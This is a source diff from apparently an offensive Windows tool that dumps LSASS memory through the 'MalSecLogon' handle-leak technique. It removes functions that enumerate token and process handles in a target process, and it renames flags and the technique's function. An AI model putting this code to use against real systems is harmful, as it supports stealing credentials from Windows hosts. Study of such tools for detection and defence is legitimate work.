@@ -5,130 +5,6 @@
 
 #if defined(NANO) && !defined(SSP)
 
-PHANDLE_LIST find_token_handles_in_process(
-    IN DWORD process_pid,
-    IN DWORD permissions)
-{
-    BOOL success = FALSE;
-
-    DPRINT("Finding token handles in the process with PID %ld", process_pid);
-
-    PHANDLE_LIST handle_list = intAlloc(sizeof(HANDLE_LIST));
-    if (!handle_list)
-    {
-        malloc_failed();
-        return NULL;
-    }
-
-    ULONG TokenTypeIndex = 0;
-    success = GetTypeIndexByName(TOKEN_HANDLE_TYPE, &TokenTypeIndex);
-    if (!success)
-    {
-        intFree(handle_list); handle_list = NULL;
-        return NULL;
-    }
-
-    PSYSTEM_HANDLE_INFORMATION handleTableInformation = get_all_handles();
-    if (!handleTableInformation)
-    {
-        intFree(handle_list); handle_list = NULL;
-        return NULL;
-    }
-
-    // loop over each handle
-    for (ULONG j = 0; j < handleTableInformation->Count; j++)
-    {
-        PSYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleTableInformation->Handle[j];
-
-        // make sure this handle is from the target process
-        if (handleInfo->UniqueProcessId != process_pid)
-            continue;
-
-        // make sure the handle has the permissions we need
-        if ((handleInfo->GrantedAccess & permissions) != permissions)
-            continue;
-
-        // make sure the handle is of type 'Token'
-        if (handleInfo->ObjectTypeIndex != TokenTypeIndex)
-            continue;
-
-        if (handle_list->Count + 1 > MAX_HANDLES)
-        {
-            PRINT_ERR("Too many handles, please increase MAX_HANDLES");
-            intFree(handleTableInformation); handleTableInformation = NULL;
-            intFree(handle_list); handle_list = NULL;
-            return NULL;
-        }
-        handle_list->Handle[handle_list->Count++] = (HANDLE)(ULONG_PTR)handleInfo->HandleValue;
-    }
-
-    intFree(handleTableInformation); handleTableInformation = NULL;
-    DPRINT("Found %ld handles", handle_list->Count);
-    return handle_list;
-}
-
-PHANDLE_LIST find_process_handles_in_process(
-    IN DWORD process_pid,
-    IN DWORD permissions)
-{
-    BOOL success = FALSE;
-
-    DPRINT("Finding process handles in the process with PID %ld", process_pid);
-
-    PHANDLE_LIST handle_list = intAlloc(sizeof(HANDLE_LIST));
-    if (!handle_list)
-    {
-        malloc_failed();
-        return NULL;
-    }
-
-    ULONG ProcesTypeIndex = 0;
-    success = GetTypeIndexByName(PROCESS_HANDLE_TYPE, &ProcesTypeIndex);
-    if (!success)
-    {
-        intFree(handle_list); handle_list = NULL;
-        return NULL;
-    }
-
-    PSYSTEM_HANDLE_INFORMATION handleTableInformation = get_all_handles();
-    if (!handleTableInformation)
-    {
-        intFree(handle_list); handle_list = NULL;
-        return NULL;
-    }
-
-    // loop over each handle
-    for (ULONG j = 0; j < handleTableInformation->Count; j++)
-    {
-        PSYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleTableInformation->Handle[j];
-
-        // make sure this handle is from the target process
-        if (handleInfo->UniqueProcessId != process_pid)
-            continue;
-
-        // make sure the handle has the permissions we need
-        if ((handleInfo->GrantedAccess & permissions) != permissions)
-            continue;
-
-        // make sure the handle is of type 'Process'
-        if (handleInfo->ObjectTypeIndex != ProcesTypeIndex)
-            continue;
-
-        if (handle_list->Count + 1 > MAX_HANDLES)
-        {
-            PRINT_ERR("Too many handles, please increase MAX_HANDLES");
-            intFree(handleTableInformation); handleTableInformation = NULL;
-            intFree(handle_list); handle_list = NULL;
-            return NULL;
-        }
-        handle_list->Handle[handle_list->Count++] = (HANDLE)(ULONG_PTR)handleInfo->HandleValue;
-    }
-
-    intFree(handleTableInformation); handleTableInformation = NULL;
-    DPRINT("Found %ld handles", handle_list->Count);
-    return handle_list;
-}
-
 VOID change_pid(
     IN DWORD new_pid,
     OUT PDWORD previous_pid)
@@ -177,9 +53,9 @@ VOID set_command_line(
     if (use_valid_sig)
         wcsncat(command_line, L" -v", MAX_PATH);
     // malseclogon
-    wcsncat(command_line, L" -m", MAX_PATH);
+    wcsncat(command_line, L" -sll", MAX_PATH);
     // --stage 2
-    wcsncat(command_line, L" --stage2", MAX_PATH);
+    wcsncat(command_line, L" -s2", MAX_PATH);
 }
 
 BOOL save_new_process_pid(
@@ -245,7 +121,7 @@ VOID kill_created_processes(
  * or use a another binary (like notepad.exe) and duplicate
  * the leaked handle in order to remain fileless
  */
-BOOL MalSecLogon(
+BOOL malseclogon_handle_leak(
     IN LPCSTR binary_path,
     IN LPCSTR dump_path,
     IN BOOL fork_lsass,
@@ -284,7 +160,7 @@ BOOL MalSecLogon(
         created_processes);
     if (!success)
     {
-        PRINT_ERR("MalSecLogon technique failed!");
+        PRINT_ERR("the --malseclogon-leak-local technique failed!");
         if (created_processes)
         {
             intFree(created_processes); created_processes = NULL;
